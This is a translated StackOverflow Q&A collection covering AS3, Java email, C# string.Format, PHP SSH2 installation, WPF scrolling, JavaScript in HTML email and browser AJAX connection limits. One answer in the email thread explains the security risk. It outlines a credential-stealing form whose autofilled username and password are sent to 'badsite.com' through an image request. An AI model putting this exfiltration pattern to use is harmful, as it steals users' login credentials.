# StackOverflow 问答 000561000-000561999

# actionscript-3 - 是否有适用于 AS3 的 fillArc 功能

> ID：561007
> 
> 赞同：1
> 
> 时间：2009-02-18T13:15:53.807
> 
> 标签：actionscript-3, flex3

AS3中是否有这种功能：

```
 g.fillArc(5,5,w-10,h-10,90,-360*value/limit);   // JAVA 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-18T13:39:14.080

据我所知没有。不过，您应该能够通过适当的调用来模拟它的行为[`Graphics.curveTo()`](http://livedocs.adobe.com/flex/2/langref/flash/display/Graphics.html#curveTo%28%29)。它正在确定正确的控制点，这使它不方便，但它是可行的。[这是一个](http://www.whizkidtech.redprince.net/bezier/circle/)关于如何用贝塞尔曲线近似圆的文档，这在确定正确的参数时会派上用场。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-18T13:55:08.223

这可能是您的解决方案：[http ://www.pixelwit.com/blog/2008/12/drawing-closed-arc-shape/](http://www.pixelwit.com/blog/2008/12/drawing-closed-arc-shape/)

# java - Java 应用程序接收传入电子邮件的最简单方法是什么？

> ID：561011
> 
> 赞同：15
> 
> 时间：2009-02-18T13:17:08.547
> 
> 标签：java, smtp, email, smtpd

使用 commons-email 发送电子邮件很容易，而使用 spring 则更容易。收到收到的电子邮件怎么办？是否有易于使用的 API 允许退回电子邮件、处理附件等？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2009-02-18T13:36:09.500

[SubEthaSMTP 邮件服务器](http://code.google.com/p/subethasmtp/)允许您创建自己的 SMTP 服务器来接收电子邮件。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-02-18T13:19:55.640

[James](http://james.apache.org)可能是您最好的选择，但电子邮件处理非常复杂，不仅需要配置 MTA（James 服务器），还需要配置 DNS。过去，我发现通过非 Java MTA（如 postfix）的钩子来启动我的处理程序更容易。procmail 也可能对您有用。不过，对于 Java MTA，James 非常满意。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-02-18T13:24:51.650

[Apache Commons Net](http://commons.apache.org/net/)是通过 POP3 获取邮件的完美库。不支持 IMAP。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-12-20T15:51:43.143

查看来自 apache camel 的 Mail 组件

[http://camel.apache.org/mail.html](http://camel.apache.org/mail.html)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-02-18T13:32:22.630

看看 Sun 自己的[JavaMail](http://java.sun.com/products/javamail/)（[API 文档](http://java.sun.com/products/javamail/javadocs/)）是否适合您的需要。

我不确定最简单的方法，但至少它是一种广泛使用的方法。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-02-18T14:47:26.130

[在此处](http://java.sun.com/developer/onlineTraining/JavaMail/contents.html#JavaMailFetching)查看 jGuru 的 JavaMail 教程。有多种方法可以读取和分离附件。

# c# - string.Format() 参数

> ID：561020
> 
> 赞同：15
> 
> 时间：2009-02-18T13:19:53.207
> 
> 标签：c#, language-features

您可以将多少个参数传递给 string.Format() 方法？

它必须有某种理论上的或强制的限制。它是基于 params[] 类型的限制还是使用它的应用程序的内存使用量，还是完全基于其他东西？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2009-02-18T13:21:53.763

据我所知没有...

好吧，理论上的限制是数组的 int32 限制，但我猜你早就达到了字符串长度限制......

只是不要对它发疯；-p 将大量小片段写入（例如）文件或响应可能比一个巨大的命中要好。

**编辑**-**看起来**IL (0xf4240) 中有一个限制，但显然这并不像看起来那样；在我简单地用完系统内存之前，我可以让它变得非常大（2 ^ 24）......

* * *

更新; 在我看来，边界点是格式字符串......那些 {1000001}{1000002} 加起来......快速的数学运算（如下）表明我们可以使用的最大**有用**参数数量是 206,449,129：

```
 long remaining = 2147483647;// max theoretical format arg length
    long count = 10; // i.e. {0}-{9}
    long len = 1;
    int total = 0;
    while (remaining >= 0) {
        for(int i = 0 ; i < count && remaining >= 0; i++) {
            total++;
            remaining -= len + 2; // allow for {}
        }
        count *= 10;
        len++;
    }

    Console.WriteLine(total - 1); 
```

* * *

## 回答 #2

> 赞同：19
> 
> 时间：2009-02-18T14:29:41.040

好的，我从隐藏中出现...我使用以下程序来验证发生了什么，而 Marc 指出像这样的字符串“{0}{1}{2}...{2147483647}”会成功参数列表之前的内存限制为 2 GiB，我的发现与您的不符。因此，可以放入 string.Format 方法调用的参数数量的硬限制必须是**107713904**。

```
int i = 0;
long sum = 0;
while (sum < int.MaxValue)
{
    var s = sizeof(char) * ("{" + i + "}").Length;
    sum += s; // pseudo append
    ++i;
}
Console.WriteLine(i);
Console.ReadLine(); 
```

喜欢讨论的人！

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-02-18T14:05:34.843

扩展 Marc 的详细答案。

唯一重要的其他限制是调试器。一旦将一定数量的参数直接传递给函数，调试器在该方法中的功能就会降低。我相信限制是 64 个参数。

注意：这并不是说一个有 64 个成员的数组，而是直接传递给函数的 64 个参数。

你可能会笑着说“谁会这样做？” 这当然是一个有效的问题。然而 LINQ 使这比您想象的要容易得多。在 LINQ 的底层，编译器会生成大量代码。对于选择了超过 64 个字段的大型生成 SQL 查询，您可能会遇到此问题。因为引擎盖下的编译器需要将所有字段传递给匿名类型的构造函数。

仍然是一个角落案例。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2009-02-18T13:34:06.633

考虑到 Array 类和 String 类的限制都是 Int32 的上限（此处记录为 2,147,483,647：[Int32 Structure](http://msdn.microsoft.com/en-us/library/system.int32.aspx)），因此可以合理地认为该值是格式参数的数字字符串的限制。

**更新**检查反射器后，约翰是对的。使用 Red Gate Reflector 的 String.Format 显示 ff：

```
public static string Format(IFormatProvider provider, string format, params object[] args)
{
    if ((format == null) || (args == null))
    {
        throw new ArgumentNullException((format == null) ? "format" : "args");
    }
    StringBuilder builder = new StringBuilder(format.Length + (args.Length * 8));
    builder.AppendFormat(provider, format, args);
    return builder.ToString();
} 
```

代码的`format.Length + (args.Length * 8)`一部分足以杀死该数字的大部分。因此，'2,147,483,647 = x + 8x' 给我们留下 x = 238,609,294（理论值）。

当然，这远远少于那个；正如评论中的人提到的字符串很可能达到字符串长度限制。

也许有人应该将其编码为机器问题！:P

# php - 为 PHP 安装 PECL SSH2 扩展

> ID：561024
> 
> 赞同：14
> 
> 时间：2009-02-18T13:21:23.357
> 
> 标签：php, ssh

我正在尝试 在 Centos 5（RHEL 5 的一个分支）上安装这个[http://fr2.php.net/manual/en/book.ssh2.php 。](http://fr2.php.net/manual/en/book.ssh2.php)

我安装了位于 /usr/lib 中的 libssh2（yum install libssh2），当我安装 SSH2 扩展（通过 pecl install -f ssh2）时，我收到了这条消息

> 检查默认路径中的 ssh2 文件...未找到配置：错误：未找到所需的 libssh2 库。[您可以从http://sourceforge.net/projects/libssh2/](http://sourceforge.net/projects/libssh2/)获取该软件包 错误：`/tmp/pear/download/ssh2-0.11.0/configure --with-ssh2=/usr' failed

如果我设置 /usr/lib，我会收到相同的消息

> 错误：`/tmp/pear/download/ssh2-0.11.0/configure --with-ssh2=/usr/lib' 失败

哪里有问题？

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2009-02-18T13:54:13.217

[从http://sourceforge.net/projects/libssh2/](http://sourceforge.net/projects/libssh2/)通过 tar.gz 安装 libssh2有很大帮助（--with-ssh2=/usr/local/include/）。

但是“yum install libssh2-devel”是一个更好的主意。

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2015-10-28T01:34:17.377

```
$ sudo pecl channel-update pecl.php.net
$ sudo apt-get install libssh2-1-dev
$ sudo pecl install -a ssh2-0.12
$ echo 'extension=ssh2.so' | sudo tee /etc/php5/mods-available/ssh2.ini > /dev/null
$ sudo php5enmod ssh2 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2016-01-08T14:51:25.143

`yum install libssh2-devel`对我不起作用：

没有可用的软件包 libssh2-devel。

所以我从[rpmfind](https://www.rpmfind.net/linux/rpm2html/search.php?query=libssh2-devel)下载了 rpm 包并安装了`rpm -ivh`

之后只是添加`extension=ssh2.so`到`/etc/php.d/ssh2.ini`

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2018-10-15T13:38:09.337

这是来自@klay 的更新[答案](https://stackoverflow.com/a/33381432/2604320)+来自@avn 的修改来自**PHP 7.x**工作解决方案下的评论。

```
$ sudo pecl channel-update pecl.php.net
$ sudo apt-get install libssh2-1-dev
$ sudo pecl install -a ssh2-1.0
$ echo 'extension=ssh2.so' | sudo tee /etc/php/7.2/mods-available/ssh2.ini > /dev/null
$ sudo phpenmod ssh2 
```

关于线路：

```
echo 'extension=ssh2.so' | sudo tee /etc/php/7.2/mods-available/ssh2.ini > /dev/null 
```

确保路径`/etc/php/7.2/mods-available`有效并且与您的 php 版本匹配。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2016-08-04T15:25:42.530

我在 Centos 上运行，这些答案都不是我的完整解决方案。我按照[以下说明](http://blog.dynamichosting.biz/2011/01/10/installing-ssh2-extension-for-php-on-centos-5/)进行操作：

```
$ sudo yum install -y gcc php-devel php-pear libssh2 libssh2-devel 
```

但`php-devel`不会安装，抱怨冲突。我搜索了 yum 以找到我可用的 php 开发包

```
$> yum search php|grep devel
...
php55u-devel.x86_64 : Files needed for building PHP extensions
php56u-devel.x86_64 : Files needed for building PHP extensions
php70u-devel.x86_64 : Files needed for building PHP extensions
... 
```

所以我跑了

```
$> sudo yum install -y php56u-devel 
```

它安装干净。然后，继续按照说明，我跑了

```
$ pecl install -f ssh2 
```

它编译。然后我将扩展名添加到 php

```
$ touch /etc/php.d/ssh2.ini
$ echo extension=ssh2.so > /etc/php.d/ssh2.ini 
```

在我的系统上，而不是

```
$ /etc/init.d/httpd restart 
```

我必须做

```
$ sudo /bin/systemctl restart  php-fpm.service 
```

这就是安装的所有步骤。最后确认：

```
$> php -m|grep ssh2
ssh2 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2010-06-18T17:51:51.163

我有这个问题：

我使用的是 Pair.com“高级”托管帐户，所以我可以做的事情有点限制。我认为我不能`yum`，也`aptitude`不能使用任何其他预编译包。

我已经下载并编译了 libssh2。在此`pecl`过程中，它会询问图书馆的位置。它在“~/usr/local/lib”中，我尝试了几种变体，包括完全限定的。但我一直收到同样的错误。

错误消息没有准确说明它要查找的文件。libssh2.so 在该目录中。我知道输出应该是 ssh2.so。我想知道是否应该有 ss2.something 或 libssh.nothing？

我就这样修好了。就我而言，在编译 libssh2 之后，我下载了 PEAR 压缩包。诀窍是：

```
./configure --with-ssh2=<libssh2 location> --prefix=<libssh2 location> 
```

另一个技巧是，由于 Pair.com 正在运行 FreeBSD，我必须执行“cd”。在 ./configure 命令之后。否则，make 会产生“Permission denied”错误。显然，这对于所有 *nix BSD 风格都是必需的。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2021-06-26T01:51:24.857

错误：

```
checking for ssh2 files in default path... not found
configure: error: The required libssh2 library was not found. 
```

...可以在[源代码](http://git.php.net/?p=pecl/networking/ssh2.git;a=blob;f=config.m4;h=c6b5354b1f4ac542a3068d418a58d77de5e22b33;hb=HEAD#l23)中看到。

`/include/libssh2.h`代码中的逻辑表明，如果它在任何一个中找不到`/usr/local`，`/usr`或者在可选 `--with-ssh2=[DIR]`指令提供的路径中都找不到，它将引发此错误。换句话说，在不自定义指令的情况下，它需要找到以下之一：

```
/usr/local/include/libssh2.h
/usr/include/libssh2.h 
```

如果它通过了这个检查，那么它就假设它可以`lib`在`/usr/local/lib`or找到 libssh2 `/usr/lib`。

希望以上信息足以帮助某人调试他们的问题。我自己的案例是相当具体和不寻常的（在自定义安装路径中使用 Homebrew 的 macOS），但如果它对其他人有帮助，这是我可怕的 hacky 解决方法。完美运行哈哈

简而言之，我正在创建两个临时符号链接，以便 pecl 可以在它期望的位置找到 ssh2。

```
# First check that neither /usr/local/include nor /usr/local/lib exists

sudo ln -s /usr/local/CustomInstallPath/Homebrew/Cellar/libssh2/1.9.0_1/include /usr/local/include
sudo ln -s /usr/local/CustomInstallPath/Homebrew/Cellar/libssh2/1.9.0_1/lib /usr/local/lib
pecl install -a ssh2-1.3.1
sudo rm -rf /usr/local/include
sudo rm -rf /usr/local/lib 
```

# c# - 从代码中滚动 WPF FlowDocumentScrollViewer？

> ID：561029
> 
> 赞同：10
> 
> 时间：2009-02-18T13:22:42.030
> 
> 标签：c#, .net, wpf, flowdocument

我有一个 FlowDocumentScrollViewer 我想在添加文本时自动滚动到底部。

```
<FlowDocumentScrollViewer Name="Scroller">
 <FlowDocument Foreground="White" Name="docDebug" FontFamily="Terminal">
  <Paragraph Name="paragraphDebug"/>
 </FlowDocument>
</FlowDocumentScrollViewer> 
```

在代码中，我将内联添加到段落中，但是当文本过多时，我希望能够使用代码简单地向下滚动，而不是让用户这样做。

有什么建议么？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2009-02-18T14:42:24.037

尝试：

```
Scroller.ScrollViewer.ScrollToEnd(); 
```

其中“Scroller”是您的 FlowDocumentScrollViewer 的名称。

**编辑**：我写这个答案有点太快了。FlowDocumentScrollViewer 不公开 ScrollViewer 属性。我实际上扩展了 FlowDocumentScrollViewer 类并自己实现了 ScrollViewer 属性。这是实现：

```
 /// <summary>
  /// Backing store for the <see cref="ScrollViewer"/> property.
  /// </summary>
  private ScrollViewer scrollViewer;

  /// <summary>
  /// Gets the scroll viewer contained within the FlowDocumentScrollViewer control
  /// </summary>
  public ScrollViewer ScrollViewer
  {
     get
     {
        if (this.scrollViewer == null)
        {
           DependencyObject obj = this;

           do
           {
              if (VisualTreeHelper.GetChildrenCount(obj) > 0)
                 obj = VisualTreeHelper.GetChild(obj as Visual, 0);
              else
                 return null;
           }
           while (!(obj is ScrollViewer));

           this.scrollViewer = obj as ScrollViewer;
        }

        return this.scrollViewer;
     }
  } 
```

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2013-03-03T12:39:51.853

我遇到过类似的问题：我想要一个*文本区域*，它可以保存我的文本，能够包装它，它填充它的父控件并且是可滚动的。

首先，我尝试将*TextBlock*与*ScrollViewer*一起使用，我认为它有效，但出于某种原因，我想使用*FlowDocument*而不是*FlowDocumentScrollViewer*。后者没有用，我就是不能让战斗无人看管，所以我试图找到解决方案，这就是我到达这里的原因。我尝试应用原始问题的答案中提供的解决方法，但是这两种解决方案都不适合我（我使用的是 .NET 4.5，也许它适用于其他版本，但我不知道）。

我也尝试过单独使用单个*FlowDocument*，但该控件包含一些我不想要的 UI 元素。所以，我想出了另一个解决方案。

```
 <ScrollViewer VerticalScrollBarVisibility="Auto">
    <FlowDocumentScrollViewer HorizontalScrollBarVisibility="Hidden" VerticalScrollBarVisibility="Hidden">
      <FlowDocument> 
```

这是正确的。有用！调用*ScrollViewer.ScrollToBottom()*就可以了！*ScrollViewer*启用滚动，而FlowDocumentScrollViewer*从 FlowDocument**中*删除 UI 元素。希望能帮助到你！

* * *

显然我的构造有一个缺陷，因为这样*FlowDocument*不能通过鼠标的滚轮滚动。但是，将*FlowDocumentScrollViewer*控件的*IsHitTestVisible*属性设置为*False*可以解决此问题。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2009-03-29T14:32:18.263

这里给出的其他答案有点令人费解，因为我在 FlowDocumentScrollViewer 上看不到任何公共的“ScrollViewer”属性。

我解决了这样的问题。请注意，此方法在初始化期间可能会返回 null：

```
public static ScrollViewer FindScrollViewer(this FlowDocumentScrollViewer flowDocumentScrollViewer)
{
    if (VisualTreeHelper.GetChildrenCount(flowDocumentScrollViewer) == 0)
    {
        return null;
    }

    // Border is the first child of first child of a ScrolldocumentViewer
    DependencyObject firstChild = VisualTreeHelper.GetChild(flowDocumentScrollViewer, 0);
    if (firstChild == null)
    {
        return null;
    }

    Decorator border = VisualTreeHelper.GetChild(firstChild, 0) as Decorator;

    if (border == null)
    {
        return null;
    }

    return border.Child as ScrollViewer;
} 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2016-08-15T09:06:55.147

这个问题是7年前提出的，现在我也遇到了同样的问题，我找到了一个简单的解决方案。以下代码向 Flowdocument 添加一个与段落相同的部分，然后滚动到末尾。

```
private void addSection(Section section)
{
    section.Loaded += section_Loaded;
    fdoc.Blocks.Add(section);
}

private void section_Loaded(object sender, RoutedEventArgs e)//scroll to end
{
    var sec = sender as Section;
    if (sec != null)
    {
        sec.BringIntoView();
    }
} 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2017-06-17T13:03:20.853

这可能是一个非常晚的答案，但我已经找到了一种方法来做到这一点。

```
//after your FlowDocumentScrollViewer(for example, x:Name="fdsv") loaded
ScrollViewer sv = fdsv.Template.FindName("PART_ContentHost", fdsv) as ScrollViewer;

sv.ScrollToBottom();
sv.ScrollToTop();
sv.ScrollToVerticalOffset(100);
// etc. 
```

检查[IScrollInfo](https://msdn.microsoft.com/en-us/library/system.windows.controls.primitives.iscrollinfo(v=vs.110).aspx)和[ScrollViewer](https://msdn.microsoft.com/en-us/library/system.windows.controls.scrollviewer(v=vs.110).aspx#Methods)了解详细信息。

我希望这可以帮助你。

# javascript - 是否可以/推荐发送包含 Javascript 的 HTML 电子邮件？

> ID：561039
> 
> 赞同：16
> 
> 时间：2009-02-18T13:26:47.790
> 
> 标签：javascript, email, web-applications, dhtml

这主要是一个修辞问题，据我检查，答案是“不要打扰”，但我想确定一下。

我们有一个电子邮件应用程序，您可以在其中向订阅者列表发送电子邮件。这不是垃圾邮件：例如，大学使用它向学生发送通信，博物馆向订阅者发送电子邮件等。

最近，一位潜在客户问我是否可以发送包含 javascript 的 html 消息而不会被标记为垃圾邮件。

不知道，我做了一次网络短途旅行，我得到的是（我的后部百分比）“一半的客户无法正确显示”，“一半的客户会将你标记为垃圾邮件”和“一半的客户”客户将完全阻止javascript'（显然有一些叠加）。

因此，如果确实需要，最好的解决方案似乎是添加指向适当页面的链接。你有不一样的体验吗？您知道任何提供此功能的电子邮件合并解决方案吗？您知道特定客户是接受还是拒绝使用 javascript 显示 html？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-02-18T13:32:31.647

您已经列出了反对在电子邮件中使用 javascript 的正确论点。这些向您表明这是一个坏主意。链接到可以自由使用 javascript 的页面是一个不错的选择，它可以让用户决定是否以及何时想要访问此“增强”内容。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-18T13:35:24.557

JavaScript 的问题在于它构成了安全威胁。如果有任何电子邮件客户端接受它，那么它很可能是一个安全漏洞，应该修复。

所以，真的，“不要打扰”，因为即使它有效，它很快就会停止工作。

编辑：有些人似乎不明白*为什么*这是一个安全风险，所以我会解释一下。

考虑以下代码（使用 Javascript 和不安全的电子邮件客户端窃取密码的多种方法之一）。

使用 JavaScript：

1.  创建一个带有“用户名”和“密码”输入字段的表单。
2.  让浏览器自动记住这些字段的内容（有几个用户将用户名和密码存储在浏览器的内存中，避免每次都要输入和记住。
3.  （自动）填写两个字段后，使用类似`<img src="badsite.com/senddata?username=user&password=pass">`.
4.  恭喜！你偷了密码！

通常，仅在您自己的不安全网站中使用 JavaScript 创建表单本身并无害，因为浏览器足够智能，可以仅将 gmail 数据告诉 gmail（而且您通常不会尝试从自己的网站窃取密码，并且在在那种情况下，无论如何都会有更简单的方法来窃取它们）。

但是，如果您在电子邮件中允许使用 JavaScript，那么浏览器将无法将合法的 JavaScript 与不安全的代码区分开来。

如果电子邮件客户端无法过滤 JavaScript，Cookie 盗窃也是可能的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-18T13:47:45.697

由于垃圾邮件如此重要，我会坚持发送易于使用的基本电子邮件。您始终可以链接到其中包含您的 javascript 的网页。您还可以在 URL 中发送一个查询字符串参数来跟踪对您的电子邮件最感兴趣的用户，因为这会告诉您他们正在点击它们。因此，尽管有可能，但最好避免它。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2010-05-20T16:53:26.397

是的，这是可能的，但不推荐。出于安全目的，大多数邮件管理软件都阻止了 js，如果他包含 js，则会发出警报。如果用户对垃圾邮件严格，那么这些邮件也会进入垃圾邮件。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2013-01-16T18:53:37.370

如果电子邮件链接到缓存了您的用户名和密码的客户端，则它是浏览器中的一个漏洞......电子邮件通常在浏览器中打开......

# visual-studio - 从磁盘中删除不在 Visual Studio 项目中的文件

> ID：561043
> 
> 赞同：1
> 
> 时间：2009-02-18T13:27:39.257
> 
> 标签：visual-studio, scripting, tidy

谁能想到一种方法（可能使用 PowerShell 脚本或类似脚本），我可以在文件夹结构中查找磁盘上的 *.cs 文件，但不包含在项目文件中？

随着时间的推移，随着 Subversion 等的合并，这种情况逐渐发生。基本上，我正在寻找一种方法来清理自己。:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-18T13:35:16.913

您的所有 .cs 文件都会在项目文件中提及，对吗？抓取 XML，列出文件，然后在整个系统上进行搜索。有效，但效率低下。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-18T13:47:14.497

解决方案资源管理器顶部的“显示所有文件”按钮，然后手动检查？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-05-02T11:59:30.363

我另一篇文章中的 PowerShell 脚本将执行此操作。该脚本将从项目文件中获取包含文件的列表，并将其与磁盘上的文件进行比较。您将获得磁盘上但未包含在项目中的一组文件。您可以删除它们，也可以将它们作为 TFS 中的删除项挂起。

脚本在这里：[https ://stackoverflow.com/a/23420956/846428](https://stackoverflow.com/a/23420956/846428)

# ajax - 流行的浏览器允许多少并发 AJAX (XmlHttpRequest) 请求？

> ID：561046
> 
> 赞同：371
> 
> 时间：2009-02-18T13:28:15.573
> 
> 标签：ajax, browser, xmlhttprequest

在 Firefox 3 中，每个域的答案是 6 个：一旦对同一域的第 7 个 XmlHttpRequest（在任何选项卡上）被触发，它就会排队等待其他 6 个完成。

其他主要浏览器的编号是多少？

此外，是否有办法绕过这些限制，而无需让我的用户修改他们的浏览器设置？例如，jsonp 请求的数量是否有限制（使用脚本标记注入而不是 XmlHttpRequest 对象）？

背景：我的用户可以从网页向服务器发出 XmlHttpRequest，要求服务器在远程主机上运行 ssh 命令。如果远程主机关闭，ssh 命令需要几分钟才能失败，最终阻止我的用户执行任何进一步的命令。

* * *

## 回答 #1

> 赞同：146
> 
> 时间：2009-02-18T13:34:26.773

您可以用来增加并发连接数的一个技巧是托管来自不同子域的图像。这些将被视为单独的请求，每个域都将被限制为并发最大值。

IE6、IE7 - 有两个限制。如果您有宽带，则 IE8 为 6 - 2（如果是拨号上网）。

* * *

## 回答 #2

> 赞同：101
> 
> 时间：2010-08-30T03:27:17.083

[Browserscope](http://www.browserscope.org/?category=network)的网络结果将为您提供**每个主机名的连接数**和流行浏览器的**最大连接数。**这些数据是通过对“野外”用户进行测试来收集的，因此它会保持最新状态。

* * *

## 回答 #3

> 赞同：25
> 
> 时间：2009-03-22T22:59:57.727

使用 IE6 / IE7 可以调整注册表中的并发请求数。以下是如何将其设置为每个四个。

```
[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings]
"MaxConnectionsPerServer"=dword:00000004
"MaxConnectionsPer1_0Server"=dword:00000004 
```

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2013-01-29T13:20:35.447

我刚刚检查了[www.browserscope.org](http://www.browserscope.org)和 IE9 和 Chrome 24，您可以有 6 个并发连接到单个域，最多 17 个到多个域。

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2011-04-12T22:42:35.517

我已经编写了一个文件 AJAX 测试器。好好享受！！！只是因为我的托管服务提供商有问题

```
<?php /*

Author:   Luis Siquot
Purpose:  Check ajax performance and errors
License:  GPL
site5:    Please don't drop json requests (nor delay)!!!!

*/

$r = (int)$_GET['r'];
$w = (int)$_GET['w'];
if($r) { 
   sleep($w);
   echo json_encode($_GET);
   die ();
}  //else
?><head>
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
<script type="text/javascript">

var _settimer;
var _timer;
var _waiting;

$(function(){
  clearTable();
  $('#boton').bind('click', donow);
})

function donow(){
  var w;
  var estim = 0;
  _waiting = $('#total')[0].value * 1;
  clearTable();
  for(var r=1;r<=_waiting;r++){
       w = Math.floor(Math.random()*6)+2;
       estim += w;
       dodebug({r:r, w:w});
       $.ajax({url: '<?php echo $_SERVER['SCRIPT_NAME']; ?>',
               data:    {r:r, w:w},
               dataType: 'json',   // 'html', 
               type: 'GET',
               success: function(CBdata, status) {
                  CBdebug(CBdata);
               }
       });
  }
  doStat(estim);
  timer(estim+10);
}

function doStat(what){
    $('#stat').replaceWith(
       '<table border="0" id="stat"><tr><td>Request Time Sum=<th>'+what+
       '<td>&nbsp;&nbsp;/2=<th>'+Math.ceil(what/2)+
       '<td>&nbsp;&nbsp;/3=<th>'+Math.ceil(what/3)+
       '<td>&nbsp;&nbsp;/4=<th>'+Math.ceil(what/4)+
       '<td>&nbsp;&nbsp;/6=<th>'+Math.ceil(what/6)+
       '<td>&nbsp;&nbsp;/8=<th>'+Math.ceil(what/8)+
       '<td> &nbsp; (seconds)</table>'
    );
}

function timer(what){
  if(what)         {_timer = 0; _settimer = what;}
  if(_waiting==0)  {
    $('#showTimer')[0].innerHTML = 'completed in <b>' + _timer + ' seconds</b> (aprox)';
    return ;
  }
  if(_timer<_settimer){
     $('#showTimer')[0].innerHTML = _timer;
     setTimeout("timer()",1000);
     _timer++;
     return;
  }
  $('#showTimer')[0].innerHTML = '<b>don\'t wait any more!!!</b>';
}

function CBdebug(what){
    _waiting--;
    $('#req'+what.r)[0].innerHTML = 'x';
}

function dodebug(what){
    var tt = '<tr><td>' + what.r + '<td>' + what.w + '<td id=req' + what.r + '>&nbsp;'
    $('#debug').append(tt);
}

function clearTable(){
    $('#debug').replaceWith('<table border="1" id="debug"><tr><td>Request #<td>Wait Time<td>Done</table>');
}

</script>
</head>
<body>
<center>
<input type="button" value="start" id="boton">
<input type="text" value="80" id="total" size="2"> concurrent json requests
<table id="stat"><tr><td>&nbsp;</table>
Elapsed Time: <span id="showTimer"></span>
<table id="debug"></table>
</center>
</body> 
```

**编辑：**
r 表示行和 w 等待时间。
当您最初按下开始按钮时，80 个（或任何其他数量）并发 ajax 请求由 javascript 启动，但众所周知，它们是由浏览器假脱机的。它们也被并行请求到服务器（限于一定数量，这是这个问题的事实）。在这里，请求以随机延迟（由 w 建立）在服务器端解决。在开始时计算解决所有 ajax 调用所需的所有时间。测试完成后，您可以查看它是否花费了总时间的一半、第三、四分之一等，其中扣除了对服务器的调用的并行度。这并不严格，也不精确，但很高兴实时查看 ajax 调用是如何完成的（查看传入的交叉）。并且是一个非常简单的自包含脚本来展示 ajax 基础知识。
当然，这是假设服务器端没有引入任何额外限制。
最好与萤火虫网络面板（或您的浏览器的等价物）结合使用

* * *

## 回答 #6

> 赞同：6
> 
> 时间：2011-05-25T18:55:09.100

根据[IE 9 – 发生了什么变化？](http://blog.httpwatch.com/2011/05/04/ie-9-whats-changed/)在 HttpWatch 博客上，IE9 在通过 VPN 时仍然有 2 个连接限制。

> **使用 VPN 仍然会破坏 IE 9 性能**
> 
> 我们之前曾报道过，当您的 PC 使用 VPN 连接时，IE 8 中的最大并发连接数会缩减。即使浏览器流量没有通过该连接也会发生这种情况。
> 
> 不幸的是，IE 9 以同样的方式受到 VPN 连接的影响：

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2014-02-28T20:25:29.317

写了我自己的测试。在stackoverflow上测试了代码，工作正常告诉我chrome/FF可以做6

```
var change = 0;
var simultanius = 0;
var que = 20; // number of tests

Array(que).join(0).split(0).forEach(function(a,i){
    var xhr = new XMLHttpRequest;
    xhr.open("GET", "/?"+i); // cacheBust
    xhr.onreadystatechange = function() {
        if(xhr.readyState == 2){
            change++;
            simultanius = Math.max(simultanius, change);
        }
        if(xhr.readyState == 4){
            change--;
            que--;
            if(!que){
                console.log(simultanius);
            }
        }
    };
    xhr.send();
}); 
```

它适用于大多数可以在不同时间触发 readystate 更改事件的网站。（又名：冲洗）

我注意到在我的 node.js 服务器上我必须输出至少 1025 个字节才能触发事件/刷新。否则，当请求完成时，事件将立即触发所有三种状态，所以这是我的后端：

```
var app = require('express')();

app.get("/", function(req,res) {
    res.write(Array(1025).join("a"));
    setTimeout(function() {
        res.end("a");
    },500);
});

app.listen(80); 
```

## **更新**

我注意到如果您同时使用 xhr 和 fetch api，您现在最多可以有 2 次请求

```
var change = 0;
var simultanius = 0;
var que = 30; // number of tests

Array(que).join(0).split(0).forEach(function(a,i){
    fetch("/?b"+i).then(r => {
        change++;
        simultanius = Math.max(simultanius, change);
        return r.text()
    }).then(r => {
        change--;
        que--;
        if(!que){
            console.log(simultanius);
        }
    });
});

Array(que).join(0).split(0).forEach(function(a,i){
    var xhr = new XMLHttpRequest;
    xhr.open("GET", "/?a"+i); // cacheBust
    xhr.onreadystatechange = function() {
        if(xhr.readyState == 2){
            change++;
            simultanius = Math.max(simultanius, change);
        }
        if(xhr.readyState == 4){
            change--;
            que--;
            if(!que){
                document.body.innerHTML = simultanius;
            }
        }
    };
    xhr.send();
});
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-02-18T13:37:34.677

我相信浏览器会对同一个域发出最大数量的并发 http 请求，根据用户的设置和浏览器，该请求的数量约为 4-8 个。

您可以设置您的请求以转到不同的域，这可能可行，也可能不可行。雅虎的人在这方面做了很多研究，你可以阅读（[这里](http://developer.yahoo.com/performance/rules.html)）。请记住，您添加的每个新域也需要进行 DNS 查找。YSlow 建议使用 2 到 4 个域，以在并行请求和 DNS 查找之间取得良好的折衷，尽管这是关注页面的加载时间，而不是后续的 AJAX 请求。

